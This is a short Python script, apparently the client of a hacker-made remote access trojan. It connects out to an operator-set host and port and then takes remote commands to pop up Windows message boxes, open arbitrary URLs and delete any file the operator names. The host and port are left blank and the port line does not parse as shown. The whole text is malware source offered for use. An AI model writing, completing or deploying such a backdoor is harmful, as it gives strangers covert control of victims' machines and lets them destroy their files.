# By Monstered <3
# No skid

import random
import socket
import ctypes
import shutil
import os
import webbrowser

host = "" # IP
port =    # PORT

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    command_server = client.recv(1024).decode('utf-8')
    if command_server == "message":
        msg = client.recv(1024)
        msg = msg.decode('utf-8')
        ctypes.windll.user32.MessageBoxW(0, f"{msg}", "", 1)
    elif command_server == "run":
        url = client.recv(1024)
        url = url.decode('utf-8')
        webbrowser.open(url)
    elif command_server == "delete":
        file = client.recv(1024)
        file = file.decode('utf-8')
        os.remove(file)